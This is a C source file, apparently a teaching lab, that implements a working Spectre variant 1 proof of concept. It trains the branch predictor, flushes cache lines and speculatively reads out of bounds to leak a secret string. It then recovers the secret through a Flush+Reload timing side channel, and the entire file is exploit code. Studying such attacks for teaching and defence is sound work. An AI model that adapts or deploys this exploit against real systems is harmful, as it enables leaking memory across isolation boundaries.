#include <stdint.h>
#include <stdio.h>
#include <x86intrin.h>
#include <emmintrin.h>

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024
unsigned int bound_lower = 0;
unsigned int bound_upper = 9;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
char *secret = "Some Secret Value"; 
uint8_t array[256*4096];
static int scores[256];

void flushSideChannel()
{
    int i;
    // Write to array to bring it to RAM to prevent Copy-on-write
    for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
    // Flush the values of the array from cache
    for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

void reloadSideChannel()
{
    int junk=0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    int i;
    for(i = 0; i < 256; i++){
    addr = &array[i*4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD){
        scores[i]++;
        }
    }
}

// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
    if (x <= bound_upper && x >= bound_lower) {
    return buffer[x];
    } else { return 0; }
}
void spectreAttack(size_t index_beyond)
{
    int i;
    uint8_t s;
    volatile int z;
    // Train the CPU to take the true branch inside restrictedAccess().
    for (i = 0; i < 10; i++) {
    restrictedAccess(i);
    }
    // Flush bound_upper, bound_lower, and array[] from the cache.
    _mm_clflush(&bound_upper);
    _mm_clflush(&bound_lower);
    for (i = 0; i < 256; i++) { _mm_clflush(&array[i*4096 + DELTA]); }
    for (z = 0; z < 100; z++) { }
    s = restrictedAccess(index_beyond);
    array[s*4096 + DELTA] += 88;
}
int main() {
    int i;
    uint8_t s;
    
    size_t index_beyond = (size_t)(secret - (char*)buffer); 
    
    flushSideChannel();
    for (i = 0; i < 256; i++){
        scores[i] = 0;
    }
    
    for (i = 0; i < 1000; i++){
        printf("*****\n");
        spectreAttack(index_beyond);
        usleep(10);
        reloadSideChannel();
    }
    int max = 0;
    for (i = 0; i < 256; i++){
        if(scores[max] < scores[i])
            max = i;
    }
    printf("Reading secret value at index %ld\n", index_beyond);
    printf("The secret value is %d(%c)\n", max, max);
    printf("The number of hits is %d\n", scores[max]);
    return (0);
}